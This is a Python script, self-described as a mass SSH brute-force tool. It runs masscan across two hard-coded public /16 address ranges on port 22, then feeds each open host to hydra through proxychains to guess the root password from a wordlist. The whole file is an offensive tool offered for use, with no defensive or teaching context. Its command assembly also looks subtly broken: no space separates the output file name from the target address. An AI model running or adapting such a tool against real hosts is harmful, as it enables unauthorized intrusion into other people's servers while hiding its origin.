#sshnuke - mass ssh bruteforce tool
#by mori

import subprocess
import shlex

nets = ["8.128.0.0", "14.103.0.0"]
for ip in nets:
    command = 'masscan ' + ip + '/16 ' + ' -p 22 ' + ' -oL scan.lst'
    execute = shlex.split(command)
    print("EXECUTING MASSCAN: ", execute)
    subprocess.call(execute)

    with open("scan.lst") as f:
        lines = f.readlines()

    for line in lines:
        scanline = "proxychains hydra -l root -P brute.txt -o results.txt" 
        if line.find('tcp') > 0:
            line = line.replace('open', '')
            line = line.replace('tcp', '')
            line = line.replace('22', '')
            line = line[:-11]
            print("TARGETING: ", line)
            scanline = scanline + line + ' -t 5 ' + 'ssh'
            print("SCANLINE: ", scanline)
            command = shlex.split(scanline)
            try:
                output = subprocess.check_output(command)       
            except:
                continue
           